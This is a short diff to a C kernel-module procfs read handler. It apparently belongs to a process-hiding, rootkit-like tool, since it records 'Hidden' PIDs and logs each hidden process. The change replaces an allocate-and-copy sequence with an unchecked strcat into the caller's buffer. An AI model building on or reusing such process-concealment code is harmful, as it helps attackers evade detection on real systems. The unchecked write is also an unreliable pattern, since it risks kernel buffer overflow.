@@ -72,11 +72,7 @@ int procfs_read( char *buffer, \
           }
           if(hidden){
             sprintf(buffer_temp, "Hidden: %d\n", pidnumber);
-            buffer_concat = kmalloc( strlen(buffer) + strlen(buffer_temp) + 1, GFP_USER);
-            strcpy(buffer_concat, buffer);
-            strcat(buffer_concat, buffer_temp);
-            memcpy(buffer, buffer_concat, strlen(buffer_concat));
-            kfree(buffer_concat);
+            strcat(buffer, buffer_temp);
             printk(KERN_DEBUG "Procces hidden PID: %d", pidnumber);
           }
         }
